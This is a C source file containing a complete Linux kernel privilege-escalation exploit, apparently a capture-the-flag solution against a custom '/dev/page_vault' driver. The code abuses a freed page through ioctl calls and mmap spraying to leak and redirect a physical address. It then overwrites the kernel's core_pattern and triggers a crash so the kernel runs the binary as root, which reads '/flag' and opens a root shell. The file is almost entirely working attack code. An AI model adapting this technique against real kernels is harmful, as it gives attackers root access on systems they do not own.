#define _GNU_SOURCE
#include <stdio.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <err.h>
#include <sys/sendfile.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/resource.h>

#define SYSCHK(x) ({              \
		typeof(x) __res = (x);        \
		if (__res == (typeof(x))-1)   \
		err(1, "SYSCHK(" #x ")"); \
		__res;                        \
		})

#define PAUSE           \
{                   \
	int x;          \
	printf(":");    \
	read(0, &x, 1); \
}


void set_cpu(int i)
{
	cpu_set_t mask;
	CPU_ZERO(&mask);
	CPU_SET(i, &mask);
	sched_setaffinity(0, sizeof(mask), &mask);
}
char buf[0x1000];

void crash(char *cmd)
{
	int memfd = memfd_create("", 0);
	SYSCHK(sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff));
	dup2(memfd, 666);
	close(memfd);
	puts("Root shell !!");
	/* Trigger program crash and cause kernel to executes program from core_pattern which is our "root" binary */
	*(size_t *)0 = 0;
}


char *addrs[0x1000];

// --- Driver IOCTL Definitions ---
#define VAULT_ALLOC _IO('k', 1)
#define VAULT_FREE  _IO('k', 2)
#define VAULT_EDIT  _IOW('k', 3, char*)
#define VAULT_READ  _IOR('k', 4, char*)

// --- Global Variables ---
int vault_fd;

void vault_alloc() { ioctl(vault_fd, VAULT_ALLOC); }
void vault_free() { ioctl(vault_fd, VAULT_FREE); }
void vault_read(char *pbuf) { ioctl(vault_fd, VAULT_READ, pbuf); }
void vault_edit(char *pbuf) { ioctl(vault_fd, VAULT_EDIT, pbuf); }


void open_vault() {
    vault_fd = SYSCHK(open("/dev/page_vault", O_RDWR));
    puts("[+] Opened page_vault driver");
}

int main(int argc, char** argv) {
	if (argc > 1)
	{

		int pid = strtoull(argv[1], 0, 10);
		int pfd = syscall(SYS_pidfd_open, pid, 0);
		int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
		int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
		int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
		dup2(stdinfd, 0);
		dup2(stdoutfd, 1);
		dup2(stderrfd, 2);
		system("cat /flag");
		system("/bin/sh");
		exit(0);
	}
	open_vault();

	vault_alloc();
	char *maddr = (void *)0x200000;
	for (int i = 0; i < 0x400; i++) {
		addrs[i] = SYSCHK(mmap(maddr + 0x200000 * i, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON | MAP_FIXED, -1, 0));
	}

	vault_free();
	int sum;
	for (int i = 0; i < 0x400; i++)
		sum += addrs[i][0];
	printf("Sum %d\n", sum);

	vault_read(buf);

#define ZERO_OFFSET 0x35f9000
#define CORE_PATTERN 0x2808a60

	size_t pa = *(size_t *)&buf[0];
	pa &= 0xfffffffff000;
	pa += 0x867;
	pa -= ZERO_OFFSET;
	pa += (CORE_PATTERN & (~0xfff));
	int offset = CORE_PATTERN & (0xfff);
	*(size_t*)&buf[0] = pa;
	vault_edit(buf);
	for (int i = 0; i < 0x400; i++)
		strcpy(&addrs[i][offset], "|/proc/%P/fd/666 %P");

	if(fork()==0) {
		setsid();
		crash("");
	}
	while(1) sleep(1);
}
